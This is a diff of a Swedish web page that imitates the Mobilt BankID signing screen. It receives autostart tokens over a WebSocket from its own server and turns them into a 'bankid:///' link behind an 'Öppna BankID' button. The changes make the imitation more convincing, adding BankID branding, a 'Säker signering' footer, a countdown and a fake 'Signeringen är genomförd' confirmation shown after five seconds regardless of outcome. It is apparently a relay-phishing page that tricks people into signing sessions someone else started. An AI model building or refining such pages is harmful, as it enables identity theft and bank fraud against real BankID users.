@@ -1,43 +1,88 @@
 <!doctype html>
-<html lang="sv"><meta charset="utf-8">
+<html lang="sv">
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>BankID</title>
+<title>Mobilt BankID</title>
 <style>
-  body{margin:0;font:16px/1.4 system-ui;background:#0d1117;color:#eee;
-       display:grid;place-items:center;height:100vh}
-  #b{padding:30px 40px;border-radius:18px;background:#1c1c1c;border:2px solid #333;
-     font-size:22px;font-weight:700;text-align:center;user-select:none}
-  #b.live{background:#1f6feb;border-color:#58a6ff;animation:p .9s infinite}
-  @keyframes p{50%{transform:scale(1.05)}}
-  #b.dead{opacity:.35}
-  small{display:block;margin-top:10px;font-weight:400;opacity:.75;font-size:14px}
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;background:#eef1f5;display:flex;flex-direction:column;
+       justify-content:center;padding:22px 18px;gap:12px;
+       font-family:-apple-system,system-ui,sans-serif}
+  .card{background:#fff;border-radius:20px;padding:30px 20px 18px;text-align:center;
+        box-shadow:0 3px 16px rgba(20,40,90,.10);display:flex;flex-direction:column;
+        align-items:center;gap:10px}
+  .mark{color:#16295C;font-size:27px;font-weight:800;letter-spacing:-.035em;line-height:1}
+  .mark span{font-weight:400}
+  .title{font-size:15px;font-weight:700;color:#111827;margin-top:4px}
+  .sub{font-size:12px;color:#6b7280;line-height:1.45;min-height:34px;max-width:220px}
+  .spin{width:22px;height:22px;border-radius:50%;border:2.5px solid #dbe2ea;
+        border-top-color:#16295C;animation:sp .8s linear infinite;display:none}
+  .spin.on{display:block}
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .go{display:none;width:100%;background:#16295C;color:#fff;border:none;border-radius:12px;
+      padding:15px;font:14px/1.2 inherit;font-weight:700;cursor:pointer}
+  .go small{display:block;margin-top:5px;font-size:10.5px;font-weight:400;opacity:.75}
+  .go:active{background:#0f1d42}
+  .go.on{display:block;animation:pl 1.1s infinite}
+  @keyframes pl{50%{transform:scale(1.025)}}
+  .go.busy{display:block;animation:none;background:#8b93a8}
+  .fb{display:none;font-size:10.5px;color:#9aa3b0;line-height:1.45}
+  .fb.on{display:block}
+  .fb b{color:#16295C}
+  .foot{font-size:9.5px;color:#b3bac5;margin-top:2px;letter-spacing:.02em}
+  .prog{height:3px;border-radius:3px;background:#dbe2ea;overflow:hidden}
+  #prog{height:100%;width:0;background:#16295C;transition:width .9s linear}
 </style>
-<div id="b">Vantar...<small>tryck nar den blinkar</small></div>
+
+<div class="card">
+  <div class="mark"><span>Bank</span>ID</div>
+  <div class="title" id="title">Mobilt BankID</div>
+  <div class="sub" id="sub">Väntar på att en signering ska startas</div>
+  <div class="spin on" id="spin"></div>
+  <button class="go" id="go">Öppna BankID<small>30 sekunder</small></button>
+  <div class="fb" id="fb">Hände inget? <b>Öppna i Chrome</b> och tryck igen.</div>
+  <div class="foot">Säker signering · BankID</div>
+</div>
+<div class="prog"><div id="prog"></div></div>
+
 <script>
 (function () {
   var code = location.pathname.split("/").pop();
-  var b = document.getElementById("b");
-  var link = null, tick = null;
+  var title = document.getElementById("title"),
+      sub = document.getElementById("sub"),
+      spin = document.getElementById("spin"),
+      go = document.getElementById("go"),
+      fb = document.getElementById("fb"),
+      prog = document.getElementById("prog"),
+      link = null, tick = null;
 
-  function connect() {
-    var ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/w/" + code);
-    ws.onmessage = function (e) {
-      var m = JSON.parse(e.data);
-      if (m.type === "token") arm(m.token, m.ttl);
-      if (m.type === "expired") die();
-    };
-    ws.onclose = function () { setTimeout(connect, 2000); };
+  function idle() {
+    clearInterval(tick);
+    link = null;
+    title.textContent = "Mobilt BankID";
+    sub.textContent = "Väntar på att en signering ska startas";
+    spin.classList.add("on");
+    go.className = "go";
+    fb.classList.remove("on");
+    prog.style.width = "0";
   }
 
   function arm(token, ttl) {
-    link = "bankid:///?autostarttoken=" + token + "&redirect=" + encodeURIComponent(location.href);
-    b.className = "live";
+    link = "bankid:///?autostarttoken=" + token +
+           "&redirect=" + encodeURIComponent(location.href);
+    title.textContent = "Signera";
+    sub.textContent = "En signering väntar på dig";
+    spin.classList.remove("on");
+    fb.classList.remove("on");
+    go.className = "go on";
     var left = ttl;
-    var draw = function () { b.innerHTML = "TRYCK HAR<small>" + left + " s</small>"; };
+    var draw = function () { go.innerHTML = "Öppna BankID<small>" + left + " sekunder</small>"; };
     draw();
+    prog.style.width = "100%";
     clearInterval(tick);
     tick = setInterval(function () {
       left--;
+      prog.style.width = Math.max(0, left / ttl * 100) + "%";
       if (left <= 0) { clearInterval(tick); die(); return; }
       draw();
     }, 1000);
@@ -45,18 +90,51 @@
 
   function die() {
     clearInterval(tick);
-    b.className = "dead";
-    b.innerHTML = "Vantar...<small>token har gatt ut</small>";
+    link = null;
+    title.textContent = "Tiden gick ut";
+    sub.textContent = "Väntar på en ny signering";
+    spin.classList.remove("on");
+    go.className = "go";
+    fb.classList.add("on");
+    prog.style.width = "0";
   }
 
-  b.onclick = function () {
+  function done() {
+    clearInterval(tick);
+    link = null;
+    title.textContent = "Klart";
+    sub.textContent = "Signeringen är genomförd";
+    spin.classList.remove("on");
+    go.className = "go";
+    go.innerHTML = "✓";
+    prog.style.width = "0";
+  }
+
+  go.onclick = function () {
     if (!link) return;
+    title.textContent = "Öppnar BankID";
+    sub.textContent = "Bekräfta i BankID-appen";
+    go.className = "go busy";
+    go.innerHTML = "Öppnar BankID…<small>signera i appen</small>";
+    prog.style.width = "0";
     location.href = link;
-    setTimeout(function () {
-      if (!document.hidden) b.innerHTML = "INGET HANDE?<small>oppna i Chrome och tryck igen</small>";
-    }, 1500);
+    setTimeout(function () { if (!document.hidden) fb.classList.add("on"); }, 1500);
+    setTimeout(done, 5000);
   };
 
+  function connect() {
+    var ws = new WebSocket(
+      (location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/w/" + code);
+    ws.onmessage = function (e) {
+      var m = JSON.parse(e.data);
+      if (m.type === "token") arm(m.token, m.ttl);
+      if (m.type === "expired") die();
+    };
+    ws.onclose = function () { setTimeout(connect, 2000); };
+    ws.onopen = function () { if (!link) idle(); };
+  }
+
+  idle();
   connect();
 })();
 </script>
